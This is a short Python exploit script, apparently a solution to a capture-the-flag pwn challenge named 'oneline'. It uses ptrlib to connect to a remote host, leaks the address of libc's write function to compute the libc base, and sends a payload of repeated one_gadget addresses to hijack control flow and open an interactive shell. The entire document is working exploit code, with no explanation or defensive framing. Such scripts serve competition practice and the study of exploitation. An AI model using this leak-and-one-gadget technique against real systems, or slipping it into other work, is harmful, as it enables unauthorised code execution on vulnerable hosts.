from ptrlib import *

libc = ELF("./libc-2.27.so")
elf = ELF("./oneline")
#sock = Process("./oneline")
sock = Socket("153.120.129.186", 10000)

sock.recvuntil(">> ")
sock.sendline("")
addr_write = u64(sock.recv(0x28)[-8:])
libc_base = addr_write - libc.symbol("write")
dump("libc base = " + hex(libc_base))
one_gadget = libc_base + 0x10a38c

sock.recvuntil(">> ")
payload = p64(one_gadget) * 5
sock.send(payload)

sock.interactive()
